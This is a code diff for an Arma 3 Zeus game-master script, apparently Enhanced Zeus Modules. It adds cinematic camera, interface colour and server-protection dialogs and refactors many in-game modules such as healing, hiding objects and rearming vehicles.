+					["Zeus Can See Cutscene?","Zeus player may experience a small lag spike when cutscene ends."],
+					[false]
+				],
+				[
+					"COMBO",
+					"Post-Process Filter",
+					[
+						["none", "highcontrast", "blue", "dull", "yellowgamma", "greengamma"],
+						["None", "High Contrast", "Blue", "Dull", "Yellow Gamma", "Green Gamma"],
+						0
+					]
+				]
+			];
+			private _onConfirm = {
+				params ["_values", "_args", "_display"];
+				_values params ["_cinematicType","_backgroundSong","_text1","_text2","_zeusCanSeeCutscene","_postProcess"];
+				private _target = _args # 0;
+				private _intertitles = [_text1,_text2];
+				[_cinematicType, _backgroundSong, _intertitles, _zeusCanSeeCutscene, _postProcess, _target] spawn HYPER_EZM_fnc_handleIntroCinematic;
+				_display closeDisplay 1;
+			};
+			private _onCancel = {
+				params ["_values", "_args", "_display"];
+				_display closeDisplay 2;
+			};
+			[
+				_dialogTitle,
+				_content,
+				_onConfirm,
+				_onCancel,
+				[_target]
+			] call MAZ_EZM_fnc_createDialog;
+			
+		};
+
+		if(isNil "MAZ_EZM_fnc_createCinematicCam") then {
+			MAZ_EZM_fnc_createCinematicCam = {
+				call MAZ_EZM_fnc_destroyCinematicCamera;
+				MAZ_EZM_CinematicCamera = "camera" camCreate [0,0,0];
+				MAZ_EZM_CinematicCamera camSetFov 1;
+				MAZ_EZM_CinematicCamera camCommit 0;
+
+				MAZ_EZM_CinematicCamera;
+			};
+			publicVariable "MAZ_EZM_fnc_createCinematicCam";
+
+			MAZ_EZM_fnc_enterCinematicCamera = {
+				"Close Zeus";
+				if(!isNull (findDisplay 312)) then {
+					(findDisplay 312) closeDisplay 0;
+					waitUntil {isNull (findDisplay 312)};
+				};
+
+				"Close arsenal";
+				if (!isNull ((findDisplay -1) displayCtrl 44046)) then {  
+					(findDisplay -1) closeDisplay 0;  
+					waitUntil {(isNull ((findDisplay -1) displayCtrl 44046))};
+				};
+
+				if (player != vehicle player) then {
+					[vehicle player, false] remoteExec ["enableSimulationGlobal", 2];
+				};
+
+				MAZ_EZM_CinematicCamera cameraEffect ["internal", "back"];
+			};
+			publicVariable "MAZ_EZM_fnc_enterCinematicCamera";
+
+			MAZ_EZM_fnc_destroyCinematicCamera = {
+				if(isNil "MAZ_EZM_CinematicCamera") exitWith {"Nothing to destroy"};
+
+				if (player != vehicle player) then {
+					[vehicle player, true] remoteExec ["enableSimulationGlobal", 2];
+				};
+
+				MAZ_EZM_CinematicCamera cameraEffect ["terminate","back"];
+				camDestroy MAZ_EZM_CinematicCamera;
+				
+
+				MAZ_EZM_CinematicCamera = nil;
+				[] spawn {
+					if(!isNull (getAssignedCuratorLogic player)) then {
+						sleep 0.2;
+						openCuratorInterface;
+						false setCamUseTI 0;
+					};
+				};
+			};
+			publicVariable "MAZ_EZM_fnc_destroyCinematicCamera";
+		};
+
+		MAZ_EZM_fnc_circleCinematic = {
+			params ["_pos","_radius","_altitude","_effect","_operationName","_operationDetail","_showGrid"];
+			private _cam = call MAZ_EZM_fnc_createCinematicCam;
+			[] spawn MAZ_EZM_fnc_enterCinematicCamera;
+
+			if(_effect == "UAV_TI") then {
+				"MAZ_EZM_CinematicLayer" cutRsc ["RscStatic","PLAIN"];
+				true setCamUseTI 0;
+			};
+			if(_effect == "UAV_NV") then {
+				"MAZ_EZM_CinematicLayer" cutRsc ["RscStatic","PLAIN"];
+				camUseNVG true;
+			};
+
+			if(_operationName != "") then {
+				private _grid = mapGridPosition _pos;
+				private _gridString = if(_showGrid) then {format ["GRID %1-%2",_grid select [0,3], _grid select [3]]} else {""};
+				[
+					[
+						[format ["OPERATION %1",toUpper _operationName], "<t align='center' shadow='1' size='1.0' font='PuristaSemiBold'>%1</t><br/>", 10],
+						[format ["%1",toUpper _operationDetail], "<t align='center' shadow='1' size='0.8'>%1</t><br/>", 10],
+						[_gridString, "<t align='center' shadow='1' size='0.6'>%1</t>", 20]
+					],
+					0,
+					safeZoneY + ((safeZoneH / 4) * 3)
+				] spawn BIS_fnc_typeText;
+			};
+
+			private _posASL = AGLtoASL _pos;
+			private _height = _posASL # 2;
+			_cam camPrepareTarget _pos;
+			_cam camCommitPrepared 0;
+
+			private _posStart = _pos getPos [_radius,0];
+			_posStart set [2,_height + _altitude];
+			_cam setPosASL _posStart;
+
+			private _angle = 0;
+			while {_angle <= 360} do {
+				private _posMove = _pos getPos [_radius,_angle];
+				_posMove set [2,_height + _altitude];
+
+				_cam camPreparePos (ASLtoAGL _posMove);
+				_cam camCommitPrepared 0.5;
+				waitUntil { camCommitted _cam };
+
+				_angle = _angle + 5;
+			};
+
+			sleep 1;
+
+			if(_effect in ["UAV_TI","UAV_NV"]) then {
+				"MAZ_EZM_CinematicLayer" cutRsc ["RscStatic","PLAIN"];
+			};
+			call MAZ_EZM_fnc_destroyCinematicCamera;
+		};
+
+		MAZ_EZM_fnc_circleCinematicDialog = {
+			private _pos = [true] call MAZ_EZM_fnc_getScreenPosition;
+			[
+				"CIRCLE CINEMATIC",
+				[
+					[
+						"SLIDER",
+						"Cinematic Radius:",
+						[
+							100,
+							300,
+							200,
+							_pos
+						]
+					],
+					[
+						"SLIDER",
+						"Cinematic Height:",
+						[100,300,200]
+					],
+					[
+						"COMBO",
+						"Cinematic Effect:",
+						[
+							["","UAV_TI","UAV_NV"],
+							["None","UAV Thermals", "UAV NVGs"],
+							0
+						]
+					],
+					[
+						"EDIT",
+						["Operation Name:","Leave blank to have no text appear"],
+						[""]
+					],
+					[
+						"EDIT",
+						"Operation Details:",
+						["Text to appear under the operation's name"]
+					],
+					[
+						"TOOLBOX:YESNO",
+						"Show Grid:",
+						[true]
+					]
+				],
+				{
+					params ["_values","_args","_display"];
+					_values params ["_radius","_height","_effect","_opName","_opDescription","_showGrid"];
+
+					[[_args,_radius,_height,_effect,_opName,_opDescription],MAZ_EZM_fnc_circleCinematic,_showGrid] remoteExec ["spawn"];
+
+					_display closeDisplay 1;
+				},
+				{
+					params ["_values","_args","_display"];
+					_display closeDisplay 2;
+				},
+				_pos
+			] call MAZ_EZM_fnc_createDialog;
+		};
 
 	comment "Clean Up";
 
@@ -9531,7 +10176,7 @@ MAZ_EZM_fnc_initFunction = {
 				_carrier setPosATL _pos;
 				_carrier setVectorDirAndUp [[sin _dir, cos _dir, 0], [0,0,1]];
 				sleep 0.5;
-				[_carrier] remoteExecCall ["BIS_fnc_Carrier01Init", 0, _carrier];
+				[_carrier] remoteExec ["BIS_fnc_Carrier01Init", 0, _carrier];
 				{deleteVehicle _x} forEach (nearestObjects [[0,0,0], ["Land_Carrier_01_hull_Base_F","DynamicAirport_01_F"], 300, true]);
 				if(!isNull _object) then {
 					{_object deleteVehicleCrew _x} forEach crew _object;
@@ -9563,7 +10208,7 @@ MAZ_EZM_fnc_initFunction = {
 				_destroyer setPosATL _pos;
 				_destroyer setVectorDirAndUp [[sin _dir, cos _dir, 0], [0,0,1]];
 				sleep 0.5;
-				[_destroyer] remoteExecCall ["BIS_fnc_Destroyer01Init", 0, _destroyer];
+				[_destroyer] remoteExec ["BIS_fnc_Destroyer01Init", 0, _destroyer];
 				{deleteVehicle _x} forEach (nearestObjects [[-300,-300,0], ["Land_Destroyer_01_Boat_Rack_01_Base_F","Land_Destroyer_01_hull_base_F","ShipFlag_US_F"], 300, true]);
 				if(!isNull _object) then {
 					{_object deleteVehicleCrew _x} forEach crew _object;
@@ -9627,7 +10272,7 @@ MAZ_EZM_fnc_initFunction = {
 							params ["_expression","_target"];
 							(parsingNamespace getVariable ["BIS_RscDebugConsoleExpressionResultCtrl", controlNull]) ctrlSetText str ([nil] apply {[_target] call _expression} param [0, text ""])
 						}
-					] remoteExec ["call", 0];  
+					] remoteExec ["call"];  
 				};
 
 				if(!isRemoteExecuted || isRemoteExecutedJIP) exitWith {};
@@ -9699,54 +10344,45 @@ MAZ_EZM_fnc_initFunction = {
 			private _strings = []; 
 			private _start = -1; 
 			
-			while {_start = _input find "//"; _start > -1} do  
-			{  
-			_input select [0, _start] call 
-			{ 
-			private _badQuotes = _this call  
-			{ 
-			private _qtsGood = []; 
-			private _qtsInfo = []; 
-			private _arr = toArray _this; 
+			while {_start = _input find "//"; _start > -1} do {
+				_input select [0, _start] call {
+					private _badQuotes = _this call { 
+						private _qtsGood = []; 
+						private _qtsInfo = []; 
+						private _arr = toArray _this; 
+						
+						{ 
+							_qtsGood pushBack ((count _arr - count (_arr - [_x])) % 2 == 0); 
+							_qtsInfo pushBack [_this find toString [_x], _x]; 
+						}forEach [34, 39]; 
+							
+						if (_qtsGood isEqualTo [true, true]) exitWith {0}; 
+							
+						_qtsInfo sort true; 
+						_qtsInfo select 0 select 1 
+					}; 
 				
-			{ 
-				_qtsGood pushBack ((count _arr - count (_arr - [_x])) % 2 == 0); 
-				_qtsInfo pushBack [_this find toString [_x], _x]; 
-			}  
-			forEach [34, 39]; 
+					if (_badQuotes > 0) exitWith {  
+						_last = _input select [_start] find toString [_badQuotes]; 
+							
+						if (_last < 0) exitWith  
+						{ 
+							_strings = [_input]; 
+							_input = ""; 
+						}; 
+							
+						_last = _start + _last + 1; 
+						_strings pushBack (_input select [0, _last]); 
+						
+						_input = _input select [_last]; 
+					}; 
 				
-			if (_qtsGood isEqualTo [true, true]) exitWith {0}; 
-				
-			_qtsInfo sort true; 
-			_qtsInfo select 0 select 1 
-			}; 
-		
-			if (_badQuotes > 0) exitWith 
-			{  
-			_last = _input select [_start] find toString [_badQuotes]; 
-				
-			if (_last < 0) exitWith  
-			{ 
-				_strings = [_input]; 
-				_input = ""; 
-			}; 
-				
-			_last = _start + _last + 1; 
-			_strings pushBack (_input select [0, _last]); 
-			
-			_input = _input select [_last]; 
-			}; 
-		
-			_strings pushBack _this; 
-			
-			_input = _input select [_start]; 
-			
-			private _end = _input find toString [10]; 
-			
-			if (_end < 0) exitWith {_input = ""}; 
-			
-			_input = _input select [_end + 1]; 
-			}; 
+					_strings pushBack _this; 
+					_input = _input select [_start]; 
+					private _end = _input find toString [10]; 
+					if (_end < 0) exitWith {_input = ""}; 
+					_input = _input select [_end + 1]; 
+				}; 
 			}; 
 			
 			_input = (_strings joinString "") + _input; 
@@ -9796,7 +10432,7 @@ MAZ_EZM_fnc_initFunction = {
 				_input = [(ctrlText ((ctrlParent (_this select 0)) displayCtrl 12284))] call MAZ_EZM_fnc_removeComments; 
 				_input = format ["this = _this select 0; %1",_input];
 				
-				[[2, compile _input,_target],{[(_this select 0), (_this select 1), (_this select 2)] call MAZ_EZM_fnc_executeExpression;}] remoteExec ['bis_fnc_call',2]; 
+				[[2, compile _input,_target],{[(_this select 0), (_this select 1), (_this select 2)] call MAZ_EZM_fnc_executeExpression;}] remoteExec ['call',2]; 
 				[(ctrlParent (_this select 0)) displayCtrl 12284] call MAZ_EZM_fnc_saveExpression; 
 				[(ctrlParent (_this select 0)), 2] call MAZ_EZM_fnc_expressionResult; 
 			}]; 
@@ -9809,7 +10445,7 @@ MAZ_EZM_fnc_initFunction = {
 				_input = [(ctrlText ((ctrlParent (_this select 0)) displayCtrl 12284))] call MAZ_EZM_fnc_removeComments; 
 				_input = format ["this = _this select 0; %1",_input];
 				
-				[[1, compile _input,_target],{[(_this select 0), (_this select 1), (_this select 2)] call MAZ_EZM_fnc_executeExpression;}] remoteExec ['bis_fnc_call',2]; 
+				[[1, compile _input,_target],{[(_this select 0), (_this select 1), (_this select 2)] call MAZ_EZM_fnc_executeExpression;}] remoteExec ['call',2]; 
 				[(ctrlParent (_this select 0)) displayCtrl 12284] call MAZ_EZM_fnc_saveExpression; 
 				[(ctrlParent (_this select 0)), 1] call MAZ_EZM_fnc_expressionResult; 
 			}]; 
@@ -10031,7 +10667,10 @@ MAZ_EZM_fnc_initFunction = {
 		MAZ_EZM_fnc_openGUIEditor = {
 			[] spawn {
 				(findDisplay 312) closeDisplay 0;
-				sleep 0.5;
+				waitUntil {isNull (findDisplay 312)};
+				if(!isMultiplayer) then {
+					sleep 0.5;
+				};
 				call BIS_fnc_GUIeditor;
 			};
 		};
@@ -10250,7 +10889,7 @@ MAZ_EZM_fnc_initFunction = {
 					]
 				],
 				[
-					"SLIDER:RADIUS",
+					"SLIDER",
 					"IED Explosive Radius",
 					[3,15,7,_pos,[1,0,0,1]]
 				],
@@ -10262,13 +10901,14 @@ MAZ_EZM_fnc_initFunction = {
 			],{
 				params ["_values","_pos","_display"];
 				_values params ["_iedType","_radius","_sides"];
+				systemChat (str _values);
 				private _trashCanTypes = ["Land_GarbageBin_01_F","TrashBagHolder_01_F"];
 				private _cardboardBox = ["Land_PaperBox_01_small_destroyed_brown_F"];
 				private _luggageTypes = ["Land_LuggageHeap_01_F","Land_LuggageHeap_03_F"];
 				private _barrelTypes = ["Land_MetalBarrel_empty_F","Land_BarrelEmpty_grey_F","Land_BarrelEmpty_F"];
 				private _vehicleWreckTypes = ["Land_Wreck_Skodovka_F","Land_Wreck_CarDismantled_F","Land_Wreck_Truck_F","Land_Wreck_Van_F","Land_Wreck_Offroad_F","Land_Wreck_Truck_dropSide_F","Land_Wreck_Offroad2_F","Land_Wreck_Car3_F","Land_Wreck_Car_F","Land_Wreck_Car2_F"];
 
-				_iedType = switch (_iedType) do {
+				_iedType = switch (parseNumber _iedType) do {
 					case 0: {selectRandom _cardboardBox};
 					case 1: {selectRandom _luggageTypes};
 					case 2: {selectRandom _trashCanTypes};
@@ -10414,7 +11054,7 @@ MAZ_EZM_fnc_initFunction = {
 				MAZ_EZM_areaMarkers = [];
 				publicVariable 'MAZ_EZM_areaMarkers';
 			};
-			private _marker = createMarker [format ["ZAM_EZM_marker_%1",count MAZ_EZM_areaMarkers],_position];
+			private _marker = createMarker [format ["MAZ_EZM_marker_%1",count MAZ_EZM_areaMarkers],_position];
 			_marker setMarkerSize [50,50];
 			_marker setMarkerShape "ELLIPSE";
 			MAZ_EZM_areaMarkers pushBack _marker;
@@ -10501,7 +11141,7 @@ MAZ_EZM_fnc_initFunction = {
 					[
 						0,
 						1,
-						1,
+						markerAlpha _marker,
 						objNull,
 						[1,1,1,1],
 						true
@@ -10641,7 +11281,7 @@ MAZ_EZM_fnc_initFunction = {
 
 		MAZ_EZM_fnc_3DSpeakModule = {
 			params ["_entity"];
-			if (isNull _object) exitWith {["Place this module onto a unit!","addItemFailed"] call MAZ_EZM_fnc_systemMessage;};
+			if (isNull _entity) exitWith {["Place this module onto a unit!","addItemFailed"] call MAZ_EZM_fnc_systemMessage;};
 			[
 				"3D Speak Message",
 				[
@@ -10871,8 +11511,7 @@ MAZ_EZM_fnc_initFunction = {
 					_speakers = [];
 					_group = createGroup (playerSide);
 					_crewman = _group createUnit ["B_Story_SF_Captain_F",[0,0,0],[],0,"CAN_COLLIDE"];
-					[_crewman, true] remoteExec ['hideObjectGlobal', 2];
-					[_crewman, name _crewman] remoteExec ['setName'];
+					_crewman hideObjectGlobal true;
 					[_crewman] joinSilent _group;
 					removeAllWeapons _crewman;
 					[_crewman,_group] spawn 
@@ -10981,9 +11620,9 @@ MAZ_EZM_fnc_initFunction = {
 					_values params ["_init","_godMode","_hidden","_sim","_lockState","_tex1","_tex2","_tex3","_tex4"];
 					_entity call (compile _init);
 					_entity allowDamage !_godMode;
-					_entity hideObjectGlobal _hidden;
+					[_entity,_hidden] remoteExec ["hideObjectGlobal",2];
 					[_entity,_sim] remoteExec ["enableSimulationGlobal",2];
-					_entity lock (parseNumber _lockState);
+					[_entity,parseNumber _lockState] remoteExec ["lock"];
 					{
 						_entity setObjectTextureGlobal [_forEachIndex,_x];
 					}forEach [_tex1,_tex2,_tex3,_tex4];
@@ -11001,28 +11640,18 @@ MAZ_EZM_fnc_initFunction = {
 			params ["_entity"];
 			if(_entity isEqualTo objNull) exitWith {["No object selected.","addItemFailed"] call MAZ_EZM_fnc_systemMessage;};
 
-			if(simulationEnabled _entity) then {
-				[_entity,false] remoteExec ["enableSimulationGlobal",2];
-				["Simulation disabled."] call MAZ_EZM_fnc_systemMessage;
-			} else {
-				[_entity,true] remoteExec ["enableSimulationGlobal",2];
-				["Simulation enabled."] call MAZ_EZM_fnc_systemMessage;
-			};
-			playSound "addItemOk";
+			private _simmed = simulationEnabled _entity;
+			[_entity, !_simmed] remoteExec ["enableSimulationGlobal", 2];
+			[["Object's simulation disabled.", "Object's simulation enabled."] select !_simmed,"addItemOk"] call MAZ_EZM_fnc_systemMessage;
 		};
 
 		MAZ_EZM_fnc_toggleInvincibleModule = {
 			params ["_entity"];
 			if(_entity isEqualTo objNull) exitWith {["No object selected.","addItemFailed"] call MAZ_EZM_fnc_systemMessage;};
 
-			if(isDamageAllowed _entity) then {
-				[_entity,false] remoteExec ["allowDamage",0];
-				["Object is god moded."] call MAZ_EZM_fnc_systemMessage;
-			} else {
-				[_entity,true] remoteExec ["allowDamage",0];
-				["Object is no longer god moded."] call MAZ_EZM_fnc_systemMessage;
-			};
-			playSound "addItemOk";
+			private _god = isDamageAllowed _entity;
+			[_entity,!_god] remoteExec ["allowDamage"];
+			[["Object is god moded", "Object is no longer god moded."] select !_god,"addItemOk"] call MAZ_EZM_fnc_systemMessage;
 		};
 
 		MAZ_EZM_fnc_toggleHideObjectModule = {
@@ -11049,6 +11678,7 @@ MAZ_EZM_fnc_initFunction = {
 				[_x,false] remoteExec ['hideObjectGlobal',2];
 			}forEach MAZ_EZM_hiddenObjects;
 			MAZ_EZM_hiddenObjects = [];
+			publicVariable "MAZ_EZM_hiddenObjects";
 
 			["All hidden objects are revealed.","addItemOk"] call MAZ_EZM_fnc_systemMessage;
 		};
@@ -11073,7 +11703,7 @@ MAZ_EZM_fnc_initFunction = {
 					params ["_newSimpleObj","_logic"];
 					waitUntil {isNull _logic};
 					deleteVehicle _newSimpleObj;
-				}] remoteExec ["Spawn",_logic];
+				}] remoteExec ["spawn",2];
 			};
 			["Object replaced with simple object.","addItemOk"] call MAZ_EZM_fnc_systemMessage;
 		};
@@ -11089,7 +11719,7 @@ MAZ_EZM_fnc_initFunction = {
 		};
 
 		MAZ_EZM_fnc_healAndReviveModule = {
-			params ["_entity",["_doMessage",true]];
+			params ["_entity"];
 			if(isNull _entity || !((typeOf _entity) isKindOf "Man")) exitWith {["Unit is not suitable.","addItemFailed"] call MAZ_EZM_fnc_systemMessage;};
 
 			if(isPlayer _entity) then {
@@ -11101,15 +11731,14 @@ MAZ_EZM_fnc_initFunction = {
 				_entity setDamage 0; 
 			};
 
-			if(_doMessage) then {
-				["The unit has been healed, and revived if possible.","addItemOk"] call MAZ_EZM_fnc_systemMessage;
-			};
+			["The unit has been healed, and revived if possible.","addItemOk"] call MAZ_EZM_fnc_systemMessage;
 		};
 
 		MAZ_EZM_fnc_healAndReviveAllModule = {
-			{
-				[_x,false] call MAZ_EZM_fnc_healAndReviveModule;
-			}forEach allPlayers;
+			[[],{
+				player setDamage 0;
+				["#rev",1,player] call BIS_fnc_reviveOnState;
+			}] remoteExec ['spawn',-2];
 			["The players have been healed, and revived if possible.","addItemOk"] call MAZ_EZM_fnc_systemMessage;
 		};
 
@@ -11189,10 +11818,6 @@ MAZ_EZM_fnc_initFunction = {
 
 			if(isPlayer _entity) then {
 				[[], {
-					if(!isNil "MAZ_customArsenalRespawnEH") then {
-						player removeEventHandler ["Respawn",MAZ_customArsenalRespawnEH];
-					};
-					player setVariable ["MAZ_customLoadoutFromModule",nil];
 					if (!isNil "M9SD_EH_arsenalRespawnLoadout") then {
 						player removeEventHandler["Respawn", M9SD_EH_arsenalRespawnLoadout];
 					};
@@ -11259,19 +11884,13 @@ MAZ_EZM_fnc_initFunction = {
 					};
 
 					{
-						[[_side,_x],{
-							params ["_sideChange","_sideFriendly"];
-							_sideChange setFriend [_sideFriendly,1];
-						}] remoteExec ['spawn',2];
+						[_side,[_x,1]] remoteExec ["setFriend",2];
 					}forEach _sides;
 					
 					private _enemySides = ([west,east,independent,civilian] - [_side]) - _sides;
 
 					{
-						[[_side,_x],{
-							params ["_sideChange","_sideFriendly"];
-							_sideChange setFriend [_sideFriendly,0.5];
-						}] remoteExec ['spawn',2];
+						[_side,[_x,0.5]] remoteExec ["setFriend",2];
 					}forEach _enemySides;
 				}forEach _values;
 				_display closeDisplay 1;
@@ -11322,7 +11941,7 @@ MAZ_EZM_fnc_initFunction = {
 				if(_score < 2000) then {
 					player addRating (2000 - _score);
 				};
-			}] remoteExec ['spawn',allPlayers];
+			}] remoteExec ['spawn',-2];
 		};
 
 		MAZ_EZM_fnc_disableMortarsModule = {
@@ -11503,6 +12122,32 @@ MAZ_EZM_fnc_initFunction = {
 				params ["_values","_args","_display"];
 				_display closeDisplay 2;
 			},[]] call MAZ_EZM_fnc_createDialog;
+		};
+
+		MAZ_EZM_fnc_toggleServerProtections = {
+			[
+				"TOGGLE SERVER PROTECTIONS",
+				[
+					[
+						"TOOLBOX:ENABLED",
+						"Enable Server Protections?",
+						[
+							missionNamespace getVariable ["MAZ_EZM_ServerProtection",true]
+						]
+					]
+				],
+				{
+					params ["_values","_args","_display"];
+					missionNamespace setVariable ["MAZ_EZM_ServerProtection",(_values # 0),true];
+					[["Server Protection System disabled.","Server Protection System enabled."] select (_values # 0),"addItemOk"] call MAZ_EZM_fnc_systemMessage;
+					_display closeDisplay 1;
+				},
+				{
+					params ["_values","_args","_display"];
+					_display closeDisplay 2;
+				},
+				[]
+			] call MAZ_EZM_fnc_createDialog;
 		};
 
 	comment "Sounds";
@@ -12611,7 +13256,7 @@ MAZ_EZM_fnc_initFunction = {
 			_logic spawn {
 				waitUntil {uiSleep 0.1; !isNull (_this getVariable ["bis_fnc_moduleTracers_gunner",objNull])};
 				private _gunner = _this getVariable "bis_fnc_moduleTracers_gunner";
-				[_gunner,true] remoteExec ['hideObjectGlobal',0,_gunner];
+				[_gunner,true] remoteExec ['hideObjectGlobal',2];
 			};
 		};
 
@@ -12974,8 +13619,7 @@ MAZ_EZM_fnc_initFunction = {
 				params ["_values","_pos","_display"];
 				_values params ["_radius"];
 				
-				private ["_modelString","_newObj","_vectorDirUp","_position","_hideTerrain","_type","_blackListFences"];
-				_blackListFences = [
+				private _blackListFences = [
 					"land_pipewall_conretel_8m_f","land_mil_wiredfence_gate_f","land_mil_concretewall_f","land_cncbarrier_f","land_cncbarrier_stripes_f",
 					"land_concrete_smallwall_8m_f","land_concrete_smallwall_4m_f",
 					"land_brickwall_04_l_pole_f","land_brickwall_03_l_pole_f",
@@ -13034,17 +13678,21 @@ MAZ_EZM_fnc_initFunction = {
 				private  _count = 0;
 				{
 					if(!alive _x) then {continue};
-					_modelString = (str _x) splitString " .";
-					_type = format ['land_%1',_modelString select (count _modelString) - 2];
+					private _modelString = ((str _x) splitString ":" select 1) select [1];
+					private _removeExtension = _modelString splitString "." select 0; 
+					private _type = format ['land_%1',_removeExtension];
 					
 					if !((toLower _type) in _blackListFences) then {
 						_count = _count + 1;
-						_position = getPosASL _x;
-						_vectorDirUp = [vectorDir _x,vectorUp _x];
-						_newObj = createSimpleObject [format ["%1",_type],_position];
-						_newObj setVectorDirAndUp [vectorDir _x,vectorUp _x];
-						[_x,true] remoteExec ['hideObject',0,true];
-						[_x,false] remoteExec ['allowDamage',0,true];
+						private _position = getPosASL _x;
+						private _newObj = createSimpleObject [format ["%1",_type],_position];
+						_newObj setPosASL _position;
+						_newObj setVectorDirAndUp [vectorDir _x,surfaceNormal _position];
+						if("pillar" in _type) then {
+							_newObj setVectorUp (vectorUp _x);
+						};
+						[_x,true] remoteExec ["hideObjectGlobal",2];
+						[_x,false] remoteExec ["allowDamage"];
 					};
 				}forEach (nearestTerrainObjects [_pos,["WALL","FENCE"],_radius]);
 
@@ -13110,13 +13758,13 @@ MAZ_EZM_fnc_initFunction = {
 				};
 				if(_hide) then {
 					{
-						[_x,true] remoteExec ['hideObject',0,_x];
-						_x allowDamage false;
+						[_x,true] remoteExec ["hideObjectGlobal",2];
+						[_x,false] remoteExec ["allowDamage"];
 					} forEach _nearestObjects;
 				} else {
 					{
-						[_x,false] remoteExec ['hideObject',0,_x];
-						_x allowDamage true;
+						[_x,false] remoteExec ["hideObjectGlobal",2];
+						[_x,true] remoteExec ["allowDamage"];
 					} forEach _nearestObjects;
 				};
 				_display closeDisplay 1;
@@ -13473,7 +14121,7 @@ MAZ_EZM_fnc_initFunction = {
 						player allowDamage false;
 						player attachTo [_unit,[0,0,0]];
 						[player,""] remoteExec ["switchMove"];
-						[player,true] remoteExec ["hideObjectGlobal"];
+						[player,true] remoteExec ["hideObjectGlobal",2];
 
 						ppeffectdestroy _blur;
 						_cam cameraeffect ["terminate","back"];
@@ -13569,9 +14217,7 @@ MAZ_EZM_fnc_initFunction = {
 						} else {
 							[player] joinSilent _oldGroup;
 						};
-						if(!_initialHidden) then {
-							[player,false] remoteExec ["hideObjectGlobal"];
-						};
+						[player,_initialHidden] remoteExec ["hideObjectGlobal",2];
 						sleep 0.01;
 					};
 				} else {
@@ -13603,11 +14249,7 @@ MAZ_EZM_fnc_initFunction = {
 			params ["_entity"];
 			if(isNull _entity) exitWith {["No object!","addItemFailed"] call MAZ_EZM_fnc_systemMessage;};
 			[[_entity],{
-				params ["_entity"];
-				[[_entity],{
-					params ["_entity"];
-					_entity setVehicleAmmo 1;
-				}] remoteExec ['spawn',owner _entity];
+				[_this,1] remoteExec ["setVehicleAmmo",owner _entity];
 			}] remoteExec ['spawn',2];
 
 			["Vehicle rearmed.","addItemOk"] call MAZ_EZM_fnc_systemMessage;
@@ -13626,9 +14268,7 @@ MAZ_EZM_fnc_initFunction = {
 		MAZ_EZM_fnc_repairVehicleModule = {
 			params ["_entity"];
 			if(isNull _entity) exitWith {["No object!","addItemFailed"] call MAZ_EZM_fnc_systemMessage;};
-			[_entity,{
-				_this setDamage 0;
-			}] remoteExec ['spawn',_entity];
+			_entity setDamage 0;
 
 			["Vehicle repaired.","addItemOk"] call MAZ_EZM_fnc_systemMessage;
 		};
@@ -13646,7 +14286,7 @@ MAZ_EZM_fnc_initFunction = {
 				[
 					"TOOLBOX",
 					"Disable Game Mod?",
-					[true,[["No, enable","Enables Game Moderator Rights."],["Yes, disable","Removes Game Moderator rights."]]]
+					[missionNamespace getVariable ["MAZ_EZM_disableModerator",true],[["No, enable","Enables Game Moderator Rights."],["Yes, disable","Removes Game Moderator rights."]]]
 				]
 			],{
 				params ["_values","_args","_display"];
@@ -13660,12 +14300,62 @@ MAZ_EZM_fnc_initFunction = {
 			},[]] call MAZ_EZM_fnc_createDialog;
 		};
 
+		MAZ_EZM_fnc_editZeusInterfaceColors = {
+			[
+				"EDIT INTERFACE COLORS",
+				[
+					[
+						"COLOR",
+						"Theme Color:",
+						[EZM_themeColor]
+					],
+					[
+						"COLOR",
+						"Dialog Color:",
+						[EZM_dialogColor]
+					],
+					[
+						"SLIDER",
+						"Opacity:",
+						[
+							0,
+							1,
+							EZM_zeusTransparency,
+							objNull,
+							[1,1,1,1],
+							true
+						]
+					]
+				],
+				{
+					params ["_values","_args","_display"];
+					_values params ["_theme","_dialog","_transparency"];
+					EZM_themeColor = _theme;
+					uiNamespace setVariable ["EZM_themeColor", EZM_themeColor];
+					profileNamespace setVariable ["MAZ_EZM_ThemeColor",EZM_themeColor];
+					EZM_dialogColor = _dialog;
+					profileNamespace setVariable ["MAZ_EZM_DialogColor",EZM_dialogColor];
+					EZM_zeusTransparency = _transparency;
+					profileNamespace setVariable ["MAZ_EZM_Transparency",EZM_zeusTransparency];
+					[] spawn MAZ_EZM_fnc_refreshInterface;
+					_display closeDisplay 1;
+				},
+				{
+					params ["_values","_args","_display"];
+					
+					_display closeDisplay 2;
+				},
+				[]
+			] call MAZ_EZM_fnc_createDialog;
+		};
+
 	comment "Auto-Add to Interface";
 	
 		MAZ_EZM_fnc_addToInterface = {
 			[] spawn {
 				if(!MAZ_EZM_autoAdd) exitWith {};
 				call MAZ_EZM_fnc_addObjectsToInterfaceModule;
+				["Objects automatically added to interface. You can disable this setting in Utilities.","addItemOK"] call MAZ_EZM_fnc_systemMessage;
 			};
 		};
 
@@ -13893,129 +14583,108 @@ MAZ_EZM_fnc_initFunction = {
 
 	comment "Pylon Editor";
 
-		"TODO : Rewrite and use a GUI instead. 3D icons is just too aids to handle with the internal bays.";
-		"https://steamcommunity.com/sharedfiles/filedetails/?id=1867660876";
-		ZAM_EZM_fnc_editVehiclePylons = {
+		MAZ_EZM_fnc_editVehiclePylons = {
 			params ["_veh"];
-			private _pylons = [];
-			{
-				if(_x find "pylon" != -1 && _x find "proxy" != -1) then {
-					_pylons pushBack _x;
-				};
-			}forEach (_veh selectionNames "FireGeometry");
+			createDialog "RscDisplayEmpty";
+			showchat true;
+			private _display = findDisplay -1;
 
-			private _pylonSlotsUnfiltered = (configFile >> "CfgVehicles" >> typeOf _veh >> "Components" >> "TransportPylonsComponent" >> "Pylons") call BIS_fnc_getCfgSubClasses;
-			private _pylonSlots = [];
-			{
-				if((toLower _x) find "bay" == -1) then {
-					_pylonSlots pushBack _x;
-				};
-			}forEach _pylonSlotsUnfiltered;
-			private _pylonsNew = [];
-			{
-				private _numberOfPylon = _x splitString ".";
-				private _pylonIndex = -1;
-				if(count _numberOfPylon != 2) then {} else {
-					_pylonIndex = (parseNumber (_numberOfPylon # 1)) - 1;
-					if(_pylonIndex <= (count _pylonSlots -1)) then {
-						_pylonsNew set [_pylonIndex,_veh selectionPosition _x]; 
-					};
-				};
-			}forEach _pylons;
+			private _label = _display ctrlCreate ["RscText",-1];
+			_label ctrlSetText (format ["EDIT AIRCRAFT PYLONS - (%1)",getText (configfile >> "CfgVehicles" >> typeOf _veh >> "displayName")]);
